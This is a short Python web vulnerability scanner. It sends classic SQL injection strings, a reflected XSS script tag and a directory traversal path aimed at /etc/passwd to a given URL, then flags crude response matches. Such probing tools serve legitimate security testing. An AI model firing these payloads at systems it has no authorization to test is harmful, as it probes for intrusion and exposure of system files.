import requests
from bs4 import BeautifulSoup
import argparse

def check_sql_injection(url):
    payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR 1=1 --']
    for payload in payloads:
        r = requests.get(url + payload)
        if "error" in r.text.lower():
            print(f"[!] SQL Injection vulnerability detected at {url}")
            return True
    return False

def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    r = requests.get(url + payload)
    if payload in r.text:
        print(f"[!] XSS vulnerability detected at {url}")
        return True
    return False

def check_directory_traversal(url):
    payload = "../../../../etc/passwd"
    r = requests.get(url + payload)
    if "root:" in r.text:
        print(f"[!] Directory Traversal vulnerability detected at {url}")
        return True
    return False

def main():
    parser = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    parser.add_argument("url", help="URL to scan")
    args = parser.parse_args()
    
    print(f"Scanning {args.url} for vulnerabilities...\n")
    
    if not check_sql_injection(args.url):
        print("[*] No SQL Injection detected.")
    if not check_xss(args.url):
        print("[*] No XSS detected.")
    if not check_directory_traversal(args.url):
        print("[*] No Directory Traversal detected.")
    
    print("\nScan complete.")

if __name__ == "__main__":
    main()
